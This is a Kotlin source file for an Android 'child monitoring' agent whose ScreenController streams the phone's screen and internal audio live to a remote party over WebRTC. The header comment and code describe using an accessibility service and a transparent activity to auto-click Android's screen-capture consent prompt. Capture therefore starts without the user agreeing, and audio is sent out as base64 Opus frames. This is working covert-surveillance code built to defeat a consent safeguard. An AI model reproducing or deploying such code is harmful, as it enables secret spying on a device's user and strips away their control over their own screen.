package com.nexus.child.components.screen

import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.os.Build
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import org.webrtc.EglBase
import org.webrtc.MediaStreamTrack
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpSender
import org.webrtc.ScreenCapturerAndroid
import org.webrtc.SurfaceTextureHelper
import org.webrtc.VideoSource
import org.webrtc.VideoTrack
import java.util.concurrent.atomic.AtomicBoolean

/**
 * ScreenController manages Full HD screen capture, system audio recording,
 * and live streaming over WebRTC for the Nexus Child monitoring agent.
 *
 * Hey friend! Here is how the end-to-end screen surveillance pipeline functions:
 * 1. Checks that NexusAccessibilityService is enabled so MediaProjection prompts can be auto-approved.
 * 2. Launches TransparentMediaProjectionActivity, which starts Android's screen capture intent.
 * 3. Accessibility auto-clicks "Start now" or "Entire screen" within 5 seconds.
 * 4. The resulting token initializes Google WebRTC's ScreenCapturerAndroid at Full HD (1920x1080 @ 30fps).
 * 5. Uses WebRTC's zero-renegotiation track switching (rtpSender.setTrack) on the pre-established video transceiver.
 * 6. On Android 10+ (API 29+), SystemAudioCapturer captures internal game and app audio via AudioPlaybackCapture,
 *    encodes 20ms frames to Opus using hardware MediaCodec, and streams "OPUS_AUDIO:<base64>" across DataChannel.
 */
class ScreenController(
    private val context: Context,
    private val factoryProvider: () -> PeerConnectionFactory?,
    private val peerConnectionProvider: () -> PeerConnection?,
    private val eglBaseContextProvider: () -> EglBase.Context? = { null },
    private val dataSender: (message: String) -> Boolean = { false }
) : IScreenController {

    companion object {
        private const val TAG = "ScreenController"
        private const val TRACK_ID = "NEXUS_SCREEN_TRACK"
        private const val CAPTURE_WIDTH = 1920
        private const val CAPTURE_HEIGHT = 1080
        private const val CAPTURE_FPS = 30
        private const val AUDIO_HEADER = "OPUS_AUDIO:"

        @Volatile
        private var activeInstance: ScreenController? = null

        /**
         * Called by TransparentMediaProjectionActivity when screen capture consent is granted.
         */
        fun onMediaProjectionGranted(resultCode: Int, data: Intent) {
            activeInstance?.handleMediaProjectionGranted(resultCode, data)
        }

        /**
         * Called by TransparentMediaProjectionActivity when screen capture is canceled or fails.
         */
        fun onMediaProjectionDenied(reason: String) {
            activeInstance?.handleMediaProjectionDenied(reason)
        }
    }

    private var eglBase: EglBase? = null
    private var surfaceTextureHelper: SurfaceTextureHelper? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var screenCapturer: ScreenCapturerAndroid? = null
    private var rtpSender: RtpSender? = null
    private var previousVideoTrack: MediaStreamTrack? = null

    // System Audio Components
    private var audioMediaProjection: MediaProjection? = null
    private var systemAudioCapturer: SystemAudioCapturer? = null
    private var opusEncoder: OpusEncoder? = null

    private val isStreamingActive = AtomicBoolean(false)

    // Handshake callbacks
    private var pendingStartCallback: (() -> Unit)? = null
    private var pendingErrorCallback: ((String) -> Unit)? = null

    init {
        activeInstance = this
    }

    /**
     * Verifies that Nexus Child is enabled in Android's Accessibility Services.
     */
    override fun hasAccessibilityPermission(): Boolean {
        return try {
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabledServices.contains(context.packageName)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking accessibility permission: ${e.message}", e)
            false
        }
    }

    /**
     * Returns true if Full HD screen video capture and streaming is currently active.
     */
    override fun isStreaming(): Boolean = isStreamingActive.get()

    /**
     * Requests screen capture permission and begins streaming upon consent.
     */
    @Synchronized
    override fun startScreenStreaming(
        onStarted: () -> Unit,
        onError: (errorMessage: String) -> Unit
    ): Boolean {
        if (!hasAccessibilityPermission()) {
            val err = "Accessibility permission not granted on child device"
            Log.w(TAG, err)
            onError(err)
            return false
        }

        if (isStreamingActive.get()) {
            Log.d(TAG, "Screen streaming is already active")
            onStarted()
            return true
        }

        this.pendingStartCallback = onStarted
        this.pendingErrorCallback = onError

        Log.d(TAG, "Launching TransparentMediaProjectionActivity for screen capture authorization...")
        try {
            TransparentMediaProjectionActivity.launch(context)
            return true
        } catch (e: Exception) {
            val err = "Failed to launch screen capture request: ${e.message}"
            Log.e(TAG, err, e)
            ScreenCaptureService.stop(context)
            pendingStartCallback = null
            pendingErrorCallback = null
            onError(err)
            return false
        }
    }

    /**
     * Handles positive MediaProjection authorization result from TransparentMediaProjectionActivity.
     */
    @Synchronized
    private fun handleMediaProjectionGranted(resultCode: Int, data: Intent) {
        Log.d(TAG, "Initializing screen capture pipeline with authorized token...")
        val factory = factoryProvider()
        val pc = peerConnectionProvider()

        if (factory == null || pc == null) {
            val err = "WebRTC PeerConnectionFactory or PeerConnection unavailable"
            Log.e(TAG, err)
            pendingErrorCallback?.invoke(err)
            clearPendingCallbacks()
            return
        }

        try {
            // Step 1: Initialize EGL context and SurfaceTextureHelper for hardware textures
            val sharedContext = eglBaseContextProvider()
            val egl = if (sharedContext != null) {
                EglBase.create(sharedContext)
            } else {
                EglBase.create()
            }
            eglBase = egl

            val helper = SurfaceTextureHelper.create("NexusScreenThread", egl.eglBaseContext)
            surfaceTextureHelper = helper

            // Step 2: Initialize ScreenCapturerAndroid
            val capturer = ScreenCapturerAndroid(data, object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.w(TAG, "MediaProjection stopped by system")
                    if (isStreamingActive.get()) {
                        stopScreenStreaming()
                    }
                }
            })
            screenCapturer = capturer

            val source = factory.createVideoSource(capturer.isScreencast)
            videoSource = source

            capturer.initialize(helper, context, source.capturerObserver)

            // Calculate native display metrics ensuring even pixel dimensions for hardware encoder
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            val displayMetrics = DisplayMetrics()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val bounds = windowManager?.currentWindowMetrics?.bounds
                if (bounds != null) {
                    displayMetrics.widthPixels = bounds.width()
                    displayMetrics.heightPixels = bounds.height()
                }
            } else {
                @Suppress("DEPRECATION")
                windowManager?.defaultDisplay?.getRealMetrics(displayMetrics)
            }

            var w = if (displayMetrics.widthPixels > 0) displayMetrics.widthPixels else 1080
            var h = if (displayMetrics.heightPixels > 0) displayMetrics.heightPixels else 1920

            if (w % 2 != 0) w -= 1
            if (h % 2 != 0) h -= 1

            // Cap resolution at 1920x1080 while strictly preserving device aspect ratio
            val maxDim = 1920
            if (w > maxDim || h > maxDim) {
                if (w > h) {
                    h = (h * maxDim) / w
                    w = maxDim
                } else {
                    w = (w * maxDim) / h
                    h = maxDim
                }
                if (w % 2 != 0) w -= 1
                if (h % 2 != 0) h -= 1
            }

            Log.d(TAG, "Starting screen capturer at ${w}x${h} @ ${CAPTURE_FPS}fps...")
            capturer.startCapture(w, h, CAPTURE_FPS)

            val track = factory.createVideoTrack(TRACK_ID, source)
            track.setEnabled(true)
            videoTrack = track

            // Step 3: Zero-renegotiation track switching on pre-established video transceiver
            val senders = pc.senders ?: emptyList()
            val existingVideoSender = senders.firstOrNull { it.track()?.kind() == "video" }
                ?: pc.transceivers?.firstOrNull { it.mediaType == MediaStreamTrack.MediaType.MEDIA_TYPE_VIDEO }?.sender

            if (existingVideoSender != null) {
                Log.d(TAG, "Attaching Screen VideoTrack to existing video RtpSender (zero renegotiation)...")
                previousVideoTrack = existingVideoSender.track()
                previousVideoTrack?.setEnabled(false) // Mute previous camera feed
                existingVideoSender.setTrack(track, false)
                rtpSender = existingVideoSender
            } else {
                Log.d(TAG, "Adding new Screen VideoTrack to PeerConnection...")
                val sender = pc.addTrack(track, listOf("nexus-video-stream"))
                rtpSender = sender
            }

            // Step 4: Asynchronously initialize System Audio Capture on Android 10+
            // Allows ScreenCapturerAndroid to complete createVirtualDisplay on the helper thread first
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                helper.handler.postDelayed({
                    try {
                        val proj = capturer.mediaProjection
                        if (proj != null && isStreamingActive.get()) {
                            startSystemAudio(proj)
                        } else {
                            Log.w(TAG, "capturer.mediaProjection still null or streaming stopped")
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Deferred system audio initialization failed: ${e.message}")
                    }
                }, 300)
            }

            isStreamingActive.set(true)
            Log.d(TAG, "Screen streaming successfully started at ${w}x${h} @ 30fps")

            pendingStartCallback?.invoke()
            clearPendingCallbacks()

        } catch (e: Exception) {
            val err = "Failed to start screen capture: ${e.message}"
            Log.e(TAG, err, e)
            cleanup()
            pendingErrorCallback?.invoke(err)
            clearPendingCallbacks()
        }
    }

    /**
     * Handles negative authorization result.
     */
    private fun handleMediaProjectionDenied(reason: String) {
        Log.w(TAG, "Screen capture authorization denied: $reason")
        ScreenCaptureService.stop(context)
        pendingErrorCallback?.invoke(reason)
        clearPendingCallbacks()
    }

    private fun clearPendingCallbacks() {
        pendingStartCallback = null
        pendingErrorCallback = null
    }

    /**
     * Starts internal audio capture and hardware Opus encoding on Android 10+.
     * Reuses the existing MediaProjection created by ScreenCapturerAndroid to comply
     * with Android 14 single-use token constraints.
     */
    private fun startSystemAudio(audioProj: MediaProjection) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            Log.d(TAG, "System audio playback capture requires Android 10+. Skipped.")
            return
        }

        try {
            Log.d(TAG, "Initializing SystemAudioCapturer and OpusEncoder with active MediaProjection...")
            audioMediaProjection = audioProj

            val encoder = OpusEncoder()
            val encoderStarted = encoder.start()
            if (!encoderStarted) {
                Log.w(TAG, "OpusEncoder failed to start")
                return
            }
            opusEncoder = encoder

            val audioCapturer = SystemAudioCapturer(audioProj) { pcmBuffer, size ->
                if (!isStreamingActive.get()) return@SystemAudioCapturer

                val opusPacket = encoder.encode(pcmBuffer, size)
                if (opusPacket != null && opusPacket.isNotEmpty()) {
                    val base64 = Base64.encodeToString(opusPacket, Base64.NO_WRAP)
                    dataSender("$AUDIO_HEADER$base64")
                }
            }

            val audioStarted = audioCapturer.startCapture()
            if (audioStarted) {
                systemAudioCapturer = audioCapturer
                Log.d(TAG, "System audio capture and Opus encoder active")
            } else {
                encoder.stop()
                opusEncoder = null
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to initialize system audio capture: ${e.message}", e)
        }
    }

    /**
     * Halts screen video and system audio capture cleanly without blocking the calling thread.
     */
    @Synchronized
    override fun stopScreenStreaming(): Boolean {
        if (!isStreamingActive.getAndSet(false)) {
            Log.d(TAG, "Screen streaming is already idle")
            return false
        }

        Log.d(TAG, "Stopping screen capture and audio recording...")

        // 1. Stop audio components
        try {
            systemAudioCapturer?.stopCapture()
            systemAudioCapturer = null
        } catch (e: Exception) {
            Log.w(TAG, "Error stopping SystemAudioCapturer: ${e.message}")
        }

        try {
            opusEncoder?.stop()
            opusEncoder = null
        } catch (e: Exception) {
            Log.w(TAG, "Error stopping OpusEncoder: ${e.message}")
        }

        audioMediaProjection = null

        // 2. Mute and restore previous video track on RtpSender (zero-renegotiation)
        try {
            videoTrack?.setEnabled(false)
            if (rtpSender != null && previousVideoTrack != null) {
                Log.d(TAG, "Restoring previous video track on RtpSender...")
                rtpSender?.setTrack(previousVideoTrack, false)
            } else if (rtpSender != null) {
                rtpSender?.setTrack(null, false)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error switching track on RtpSender: ${e.message}")
        }

        // 3. Dismiss the mediaProjection foreground service notification
        ScreenCaptureService.stop(context)

        // 4. Capture references for asynchronous background disposal to prevent Main Thread ANRs
        val capturerToDispose = screenCapturer
        screenCapturer = null
        val trackToDispose = videoTrack
        videoTrack = null
        val sourceToDispose = videoSource
        videoSource = null
        val helperToDispose = surfaceTextureHelper
        surfaceTextureHelper = null
        val eglToRelease = eglBase
        eglBase = null

        Thread({
            Log.d(TAG, "Executing WebRTC native cleanup on background disposal thread...")
            try {
                capturerToDispose?.stopCapture()
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping ScreenCapturerAndroid: ${e.message}")
            }
            try {
                capturerToDispose?.dispose()
            } catch (_: Exception) {}
            try {
                trackToDispose?.dispose()
            } catch (_: Exception) {}
            try {
                sourceToDispose?.dispose()
            } catch (_: Exception) {}
            try {
                helperToDispose?.dispose()
            } catch (_: Exception) {}
            try {
                eglToRelease?.release()
            } catch (_: Exception) {}
            Log.d(TAG, "Background WebRTC screen disposal complete")
        }, "NexusScreenDisposalThread").start()

        Log.d(TAG, "Screen streaming stop complete. Confirmation ready.")
        return true
    }

    /**
     * Completely cleans up all capture resources.
     */
    override fun cleanup() {
        stopScreenStreaming()
        if (activeInstance == this) {
            activeInstance = null
        }
    }
}
